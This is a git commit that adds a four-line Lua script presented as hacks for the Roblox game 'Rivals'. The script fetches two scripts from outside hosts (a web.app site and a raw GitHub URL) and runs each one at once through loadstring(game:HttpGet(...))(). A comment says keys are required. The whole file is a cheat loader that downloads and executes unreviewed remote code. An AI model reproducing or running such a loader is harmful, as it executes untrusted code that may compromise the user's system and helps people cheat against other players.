6c215cdb5298669af9ba2e3b4682c00f2d64bd9a
robloxbedwarshackersduo <145053198+robloxbedwarshackersduo@users.noreply.github.com>
2025-01-01 21:22:34 +0200

    Create rivals-hacks-go-to-the-other-part.lua

---
+++ rivals-hacks-go-to-the-other-part.lua
@@ -0,0 +1,4 @@
+--there are keys btw
+
+loadstring(game:HttpGet("https://x8-bit.web.app/scripts/rival_c1.lua"))()
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/Sheeshablee73/Scriptss/main/RivalsUPD2.lua')))()
